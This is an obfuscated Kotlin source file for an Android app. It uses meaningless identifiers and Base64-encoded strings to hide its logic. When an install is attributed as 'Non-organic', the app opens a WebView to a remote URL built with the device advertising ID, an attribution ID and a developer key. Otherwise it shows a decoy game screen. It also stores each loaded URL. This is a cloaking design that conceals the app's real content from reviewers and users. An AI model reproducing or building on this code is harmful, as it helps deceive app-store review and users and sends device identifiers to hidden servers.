package com.mraoj.jroek.DICTOR

import android.annotation.SuppressLint
import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.net.Uri
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.compose.runtime.Composable
import com.mraoj.jroek.Kololoeq
import com.mraoj.jroek.DADA.pivpaq
import com.mraoj.jroek.DADA.lilip
import com.mraoj.jroek.Gagan.Gane
import com.mraoj.jroek.MJ8
import com.mraoj.jroek.fincek
import com.mraoj.jroek.Chererhe
import com.onesignal.OneSignal
import kotlinx.coroutines.DelicateCoroutinesApi

@OptIn(DelicateCoroutinesApi::class)
var parasolaq = "Y29tLm1yYW9qLmpyb2Vr"


@DelicateCoroutinesApi
class PARY(context: Context) : ComponentActivity() {

    var pepii = "Z2FwcHM9NDA0"

    var Manycla = object : WebViewClient() {
        override fun onPageStarted(vol: WebView?, metcha: String?, chac: Bitmap?) {
            super.onPageStarted(vol, metcha, chac)
            if (metcha?.contains(Dep.Muoq(pepii)) == true) {
                context.startActivity(Intent(context, Gane::class.java))
                (context as Activity).finish()
            }
        }

        @SuppressLint("CommitPrefEdits")
        override fun onPageFinished(iui: WebView?, tinere: String?) {
            super.onPageFinished(iui, tinere)
            val tinkeya: SharedPreferences.Editor? = Chererhe?.edit()
            tinkeya?.putString("Loperesupere", tinere)?.apply()
        }
    }


    @Composable
    fun Handere(kikieq: MJ8) {
        val Lunuq =
            object : WebChromeClient() {
                override fun onShowFileChooser(
                    vcbnz: WebView?,
                    mxna: ValueCallback<Array<Uri>>?,
                    miminq: FileChooserParams?
                ): Boolean {
                    if (Kololoeq != null) {
                        Kololoeq!!.onReceiveValue(null)
                        Kololoeq = null
                    }
                    Kololoeq = mxna
                    try {
                        val bbikac = Intent(Intent.ACTION_GET_CONTENT)
                        bbikac.addCategory(Intent.CATEGORY_OPENABLE)
                        bbikac.type = "*/*"
                        kikieq.startActivityForResult(
                            Intent.createChooser(bbikac, "img Browsik"),
                            100
                        )
                    } catch (e21: ActivityNotFoundException) {
                        Kololoeq = null
                        return false
                    }
                    return true
                }
            }
        if (arappap.equals(Dep.Muoq("Tm9uLW9yZ2FuaWM="))) {
            val licha = lilip + papsikq
            MJ8().Venegred(entiki = licha, feefi = { wedmid ->
                if (wedmid?.canGoBack() == true) {
                    wedmid.goBack()
                }
            }, Manycla, Lunuq)
        } else if (fincek != null) {
            val bymaga = lilip + fincek
            MJ8().Venegred(entiki = bymaga, feefi = { wedmid ->
                if (wedmid?.canGoBack() == true) {
                    wedmid.goBack()
                }
            }, Manycla, Lunuq)
        } else {
            if (pivpaq == Dep.Muoq("Tk8=")) {
                val tykto = Intent(kikieq, Gane::class.java)
                kikieq.startActivity(tykto)
                finish()
            } else {
                val atiparysh = pivpaq + Dep.Muoq("P2J1bmRsZT0=") + Dep.Muoq(parasolaq) +
                        Dep.Muoq("JmFkX2lkPQ==") + tireses + Dep.Muoq("JmFwcHNfaWQ9") +
                        idead + Dep.Muoq("JmRldl9rZXk9") + Dep.Muoq(kketrik)
                val bygaga = lilip + atiparysh
                MJ8().Venegred(entiki = bygaga, feefi = { wedmid ->
                    if (wedmid?.canGoBack() == true) {
                        wedmid.goBack()
                    }
                }, Manycla, Lunuq)
            }
        }
    }
}


fun KindCheckLoop(kinede: String): String {
    var minder: String? = null
    var Namqns: String? = null
    var manxer: String? = null
    var vecrot: String? = null
    var vinograd: String? = null
    var vodkol: String? = null
    var traxik: String? = null
    lateinit var endro: Array<String>
    endro = kinede.split("::").toTypedArray()

    try {
        Namqns = endro[1]
    } catch (e: Error) {
        Namqns = ""
    }
    try {
        minder = endro[0]
    } catch (e: Error) {
        minder = ""
    }
    try {
        vecrot = endro[3]
    } catch (e: Error) {
        vecrot = ""
    }
    try {
        manxer = endro[2]
    } catch (e: Error) {
        manxer = ""
    }
    try {
        vodkol = endro[5]
    } catch (e: Error) {
        vodkol = ""
    }
    try {
        vinograd = endro[4]
    } catch (e: Error) {
        vinograd = ""
    }
    try {
        traxik = endro[6]
    } catch (e: Error) {
        traxik = ""
    }

    OneSignal.sendTag(Dep.Muoq("c3ViX2FwcA=="), Namqns)
    val Ouhent =
        (minder + Dep.Muoq("P2J1bmRsZT0=") + Dep.Muoq(parasolaq) + Dep.Muoq("JmFkX2lkPQ==") +
                tireses + Dep.Muoq("JmFwcHNfaWQ9") +
                idead + Dep.Muoq("JmRldl9rZXk9") +
                Dep.Muoq(kketrik) + Dep.Muoq("JnN1YjY9") +
                Namqns + Dep.Muoq("JnN1Yjc9") + manxer +
                Dep.Muoq("JnN1YjI9") + vecrot +
                Dep.Muoq("JnN1YjM9") + vinograd +
                Dep.Muoq("JnN1YjQ9") + vodkol +
                Dep.Muoq("JnN1YjU9") + traxik)
    return Ouhent
}
